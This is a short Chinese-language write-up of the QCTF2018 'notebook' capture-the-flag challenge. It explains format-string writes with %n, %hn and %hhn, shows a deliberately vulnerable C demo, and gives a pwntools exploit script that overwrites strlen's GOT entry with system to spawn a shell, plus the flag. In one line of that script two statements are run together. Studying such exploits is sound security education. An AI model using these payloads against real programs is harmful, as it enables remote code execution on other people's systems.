# QCTF2018 notebook
## Author: 文火
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>这题就是字符串格式化漏洞，常规操作我就不说了，有两点要知道就是：</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>1.**n是改四个字节，hn改两个字节，hhn改一个字节**，所以可以利用这点修改got表为system函数的got表；</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>2.**32位中printf的format里从esp开始的第1个（从0开始数）四个字节为1$，sprintf的第2个为1$。**64位的位置可调试得出，跟32位不一样因为传参规则不同。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>我写了一个demo来表示这题的利用思路，也方便日后复习了，至于这题的脚本[从这](http://invicsfate.cc/2018/07/16/QCTF-xman/)搬运。</font></br>

demo
=========

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

//got address:
//system 0x804a018
//puts   0x804a014

char buf[0x100]={0,};
unsigned int pri_addr=0x804a014;
char* bin="/bin/sh\0";
char* string="%%1$176s%%15$hhn";

int main()
{
	char* ptr=string;
	char BUF[0x100];
	char format[0x20];
	char* string="aaaaaaaa";

	*(unsigned int*)format=pri_addr;

	system("sleep 0.1");
	for(int i=4;i<32;i++)
	  format[i]=*ptr++;
	
	sprintf(BUF,format,string);
	printf(BUF);

	memcpy(buf,bin,8);
	puts(buf);
    //题中可以利用strlen(buf)来getshell。也就是修改strlen的got表。

	return 0;
}
```

Exploit
======

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
#Author:Invicsfate

from pwn import *

# 更正思路,修改strlen函数got表->system，输入/bin/sh，直接调用
# 0x0804A038 -> 080485C0
# payload1 = p32(0x0804A03A)+"%%14$hhn%%4c%%20$hhn"+p32(0x0804A03B)+"22%%119c%%25$hhn"+p32(0x0804A039)+"%%55c%%30$hhn222"+p32(0x0804A038)+"%11c"
# payload2 = "2222"+"%%17$hhn"+p32(0x0804A03A)+"%%20$hhn"+p32(0x0804A03B)+"%%119c"+"22"+"%%25$hhn"+p32(0x0804A039)+"222"+"%%52c"+"%%30$hhn"+p32(0x0804A038)+"%10c"
# QCTF{f0rmat_s7r1ng_is_happy_}

def pwnIt():
	p = process("./notebook")
#	gdb.attach(p)
	p.recvuntil("May I have your name?\n")
	payload = p32(0x0804A03A)+"%%14$hhn%%4c%%20$hhn"+p32(0x0804A03B)+"22%%119c%%25$hhn"+p32(0x0804A039)+"%%55c%%30$hhn222"+p32(0x0804A038)+"%11c"			p.sendline(payload)
	p.recvuntil("on the notebook?\n")
	p.sendline("/bin/sh\x00")
	p.interactive()


if __name__=="__main__":
	pwnIt()
```